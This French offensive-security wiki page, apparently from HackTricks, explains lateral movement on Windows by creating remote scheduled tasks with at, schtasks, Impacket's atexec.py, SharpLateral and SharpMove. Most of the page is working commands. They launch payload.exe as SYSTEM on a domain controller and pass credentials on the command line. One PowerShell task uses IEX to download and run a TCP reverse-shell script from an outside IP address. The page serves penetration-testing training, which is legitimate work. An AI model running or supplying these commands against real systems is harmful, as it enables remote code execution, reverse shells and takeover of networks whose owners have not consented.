# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Fonctionnement

Avec un accès administrateur à un hôte Windows, un opérateur peut créer et démarrer une tâche planifiée à distance. L’option `/S` sélectionne l’hôte distant, `/U` et `/P` fournissent les identifiants nécessaires à la création de la tâche, et `/RU` sélectionne le compte sous lequel la tâche s’exécute. La commande référencée par `/TR` doit exister sur le système distant.<sup>[[1]](#references)</sup>

L’ancienne commande `at` peut également planifier une commande sur un hôte distant lorsque le service Schedule est en cours d’exécution. Elle exécute les tâches planifiées avec le compte de service, qui est généralement `SYSTEM` :<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Créez la tâche, puis démarrez-la :
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Par exemple :
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Pour une tâche hebdomadaire récurrente, utilisez une planification hebdomadaire valide et spécifiez explicitement le jour :
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Une action de tâche peut également invoquer PowerShell directement. L’exemple de lab suivant télécharge et exécute un script ; hébergez le payload uniquement sur une infrastructure autorisée pour l’évaluation :
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket's `atexec.py` automatise l'exécution de commandes à distance via le service Task Scheduler et accepte une authentification par mot de passe, par hash NTLM ou Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral fournit une méthode d’exécution via des tâches planifiées :<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove fournit une autre implémentation de Task Scheduler :<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Plus d'informations sur [**l'utilisation de schtasks avec les silver tickets ici**](../active-directory-methodology/silver-ticket.md#host).

Supprimez les tâches de test après utilisation :
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
